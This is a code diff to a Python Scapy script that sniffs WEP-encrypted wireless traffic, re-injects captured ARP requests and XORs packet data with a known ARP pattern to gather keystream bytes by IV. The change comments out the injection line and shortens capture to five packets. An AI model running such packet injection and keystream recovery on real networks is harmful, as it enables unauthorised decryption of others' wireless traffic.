@@ -40,6 +40,7 @@ def arp_monitor_callback(pkt):
         layers = list(expand(pkt))
         if '802.11 WEP packet' in layers:
             arp_packets_captured += 1
+            print(arp_packets_captured)
             # pkt.show()
             src_address = pkt.addr2
             bssid = pkt.addr1
@@ -56,7 +57,7 @@ def arp_monitor_callback(pkt):
                 # FIXME Have this on a new thread?
                 # FIXME Spawn the new thread once this is not None
                 re_injection_packet.addr2 = source_mac
-                sendp(re_injection_packet, iface=iface)
+                # sendp(re_injection_packet, iface=iface, count=20, inter=0.100)
                 xor = data_dec ^ int(ARP_REQUEST_PATTERN, 16)
                 keystream_first_bytes = hex(xor)[2:]
                 if iv_hexstring not in keystreams:
@@ -67,6 +68,11 @@ def arp_monitor_callback(pkt):
                 keystream_first_bytes = hex(xor)[2:]
                 if iv_hexstring not in keystreams:
                     keystreams[iv_hexstring] = keystream_first_bytes
+
+
+def stop_condition(pkt):
+    global arp_packets_captured
+    if arp_packets_captured > 5: return True
 
 
 if __name__ == "__main__":
@@ -80,9 +86,8 @@ if __name__ == "__main__":
     iface = args.interface
 
     # sniff(iface="wlp7s0", prn=arp_monitor_callback, filter="arp", store=0)
-    while arp_packets_captured < 35000:
-        sniff(iface=iface, prn=arp_monitor_callback, store=0)
-
+    sniff(iface=iface, prn=arp_monitor_callback, store=0, stop_filter=stop_condition)
+    
     # scapy_cap = rdpcap('packets/arp_packet_dump.pcap')
     # for packet in scapy_cap:
     #     arp_monitor_callback(packet)
